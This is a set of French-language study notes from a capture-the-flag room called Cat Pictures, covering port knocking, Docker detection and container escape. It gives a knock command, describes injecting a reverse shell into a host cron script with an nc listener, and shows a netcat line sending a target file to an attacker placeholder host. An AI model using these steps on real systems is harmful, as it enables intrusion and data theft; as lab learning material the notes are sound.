# 📝 Notes de Cours : Cat Pictures (CTF)

## 1. Port Knocking (Dissimulation de services)

Le **Port Knocking** est une méthode permettant d'ouvrir dynamiquement un port sur un pare-feu en envoyant une séquence de paquets sur des ports clos prédéfinis.

### 🛠 Outil : `knock` (client)

* **Concept :** Si une séquence (ex: 111, 222, 333) est reçue par le serveur dans l'ordre, le démon `knockd` exécute une commande (souvent l'ouverture d'une règle IPTables pour ton IP).
* **Commande d'attaque :**
```bash
knock -v <IP_CIBLE> <port1> <port2> <port3> -d 100

```


* **Options clés :**
* `-v` : Mode verbeux (pour voir l'envoi des paquets).
* `-d <ms>` : **Délai entre les coups.** Crucial pour éviter que les paquets n'arrivent dans le désordre ou ne soient ignorés par un IPS.



---

## 2. Détection d'Environnement (Docker / Conteneur)

Avant de tenter une escalade, il faut savoir où l'on se trouve.

### 🔍 Signes d'un conteneur Docker :

1. **Fichier caché :** Présence de `/.dockerenv` à la racine.
2. **Système de fichiers :** Présence de `/sys/fs/cgroup`.
3. **Processus :** Très peu de processus visibles avec `ps aux`.

---

## 3. Évasion de Conteneur (Container Escape)

Si le conteneur est mal configuré (mode privilégié ou montages sensibles), on peut s'échapper vers l'hôte.

### 🕵️‍♂️ Méthodologie :

1. **Analyser les montages :**
```bash
mount | grep -v 'type (tmpfs|proc|sysfs)'

```


*Chercher un montage qui pointe vers l'hôte (ex: `/dev/sda1` monté sur `/mnt/host` ou un dossier inhabituel).*
2. **Exploitation via Script partagé :**
Si un script situé sur le montage de l'hôte est exécuté régulièrement par l'hôte (via une tâche cron par exemple) :
* Identifier le script.
* Injecter un **Reverse Shell** à l'intérieur.
* Attendre la connexion sur ton listener (`nc -lvnp <port>`).



### 💡 Astuce Rapidité :

Utiliser le site [revshells.com](https://www.revshells.com/) (Reverse Shell Generator) pour obtenir une "one-liner" Bash ou Python rapidement.

---

## 4. Transfert de fichiers (Netcat)

Quand on n'a pas SSH ou SCP :

* **Récepteur (Exegol) :** `nc -lvnp 9005 > fichier_recu`
* **Émetteur (Cible) :** `nc <IP_EXEGOL> 9005 < fichier_source`

